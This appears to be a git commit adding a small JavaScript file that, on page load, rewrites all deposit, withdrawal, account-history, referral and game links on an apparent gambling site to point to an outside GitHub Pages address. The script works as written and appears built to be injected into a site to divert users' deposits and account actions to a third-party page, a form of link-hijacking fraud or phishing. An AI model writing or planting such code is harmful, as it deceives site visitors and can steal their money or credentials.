84acca84a4744ca94291a3c0069ab2afd6a49510
inggarfi <inggarsaput@gmail.com>
2025-11-02 16:22:03 +0700

    Create bgd3.js

---
+++ bgd3.js
@@ -0,0 +1,5 @@
+document.addEventListener("DOMContentLoaded", function () {
+  document.querySelectorAll(
+    'a[href*="/m/account/deposit"], a[href*="/m/account/withdrawal"], a[href*="/m/account/history"], a[href*="/m/account/refferal-downline"], a[href*="/m/sports/"], a[href*="/m/casino/"], a[href*="/m/poker/"], a[href*="/m/lottery/"], a[href*="/m/slots/"]'
+  ).forEach(link => link.href = "https://inggarfi.github.io/depoyukbos/ayok/");
+});
